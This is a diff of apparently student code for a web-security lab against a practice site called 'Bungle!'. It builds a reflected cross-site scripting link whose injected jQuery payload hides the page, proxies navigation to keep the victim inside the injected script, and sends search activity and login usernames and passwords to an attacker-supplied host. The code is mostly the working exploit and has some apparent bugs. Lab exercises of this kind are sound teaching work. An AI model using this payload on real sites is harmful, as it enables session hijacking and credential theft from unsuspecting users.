@@ -2,52 +2,56 @@
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 <script>
 // Extend this function:
-state = "login";
+
 function payload(attacker) {
     function log(data) {
         console.log($.param(data));
         $.get(attacker, data);
     }
     function proxy(href, state) {
-        if(state == "search"){
+        if(state == "nav"){
             $("html").load(href, function(){
                 $("html").show();
-                log({event: "nav", uri: href});
+                log({event: state, uri: href});
                 window.history.replaceState('', "Bungle!","./search");
             });
         } else if(state == "login"){
-            $("html").load(href, function(){
+            $("html").load(state, function(){
                 $("html").show();
-                log({user:username, pass: password});
+                log({event: "login", user:username, pass: password});
                 window.history.replaceState('', "Bungle!","./search");
             });
         } else if(state == "logout"){
             $("html").load(href, function(){
                 $("html").show();
-                log({event: "BUTT", uri: href});
+                log({event: state, uri: href});
                 window.history.replaceState('', "Bungle!","./search");
             });
         }
     }
     $("html").hide();
-    if(state == "nav"){
-        proxy("./", "search");
-    } else if (state == "login"){
-        proxy("./", "login");
-    } else if (state == "logout"){
-        proxy("./", "logout");
-    }
+
+    proxy("./", "nav");
+   
     $(function(){
         $(".search-well form").submit(function(e){
             alert("POOP");
             e.preventDefault();
+                
+            proxy("./search?q="+$("#query").val(), "nav");
         });
         $(".well form").submit(function(e){
             alert("BUTT");
             e.preventDefault();
-            
+            proxy("./login", "login");
         });
+        $("#search-again-btn").click(function(e){
+            alert("POOPING AGAIN");
+            
+            e.preventDefault();
+            proxy("./", "nav");
 
+        });
     });
 }
 
@@ -57,7 +61,7 @@ function payload(attacker) {
 function makeLink(xssdefense, target, attacker) {
     if (xssdefense == 0) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-        encodeURIComponent("<script" + ">state=\"logout\";" + payload.toString() +
+        encodeURIComponent("<script" + ">" + payload.toString() +
         ";payload(\"" + attacker + "\");</script" + ">");
     } else {
         // Implement code to defeat XSS defenses here.
